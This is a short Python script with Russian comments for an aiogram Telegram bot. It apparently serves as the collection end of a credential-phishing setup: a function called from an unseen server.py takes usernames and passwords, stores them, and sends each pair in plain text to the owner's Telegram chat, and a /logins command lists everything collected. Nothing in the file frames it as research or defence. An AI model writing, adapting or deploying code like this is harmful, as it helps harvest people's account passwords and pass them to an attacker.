from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from datetime import datetime
import logging

API_TOKEN = "твой_токен"  # ← замени на свой
OWNER_ID = 123456789      # ← замени на свой Telegram user ID

# Логирование
logging.basicConfig(level=logging.INFO)

# Бот и диспетчер
bot = Bot(token=API_TOKEN, parse_mode="HTML")
dp = Dispatcher(bot)

# Память
logins = []

# Команда /start
@dp.message_handler(commands=["start"])
async def cmd_start(message: types.Message):
    if message.from_user.id == OWNER_ID:
        await message.answer("✅ Бот запущен. Жду логины.")
    else:
        await message.answer("❌ У тебя нет доступа.")

# Команда /logins
@dp.message_handler(commands=["logins"])
async def cmd_logins(message: types.Message):
    if message.from_user.id != OWNER_ID:
        return
    if not logins:
        await message.answer("📭 Пока логинов нет.")
    else:
        text = "🗂 <b>Список логинов:</b>\n\n" + "\n\n".join(logins)
        await message.answer(text)

# Функция для вызова из server.py
async def add_login(username, password):
    now = datetime.now().strftime("%d.%m.%Y %H:%M")
    msg = (
        f"<b>🔐 Новый логин</b>\n"
        f"👤 <b>Логин:</b> {username}\n"
        f"🔑 <b>Пароль:</b> {password}\n"
        f"📅 <b>Время:</b> {now}"
    )
    logins.append(msg)
    await bot.send_message(chat_id=OWNER_ID, text=msg)

# Запуск
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
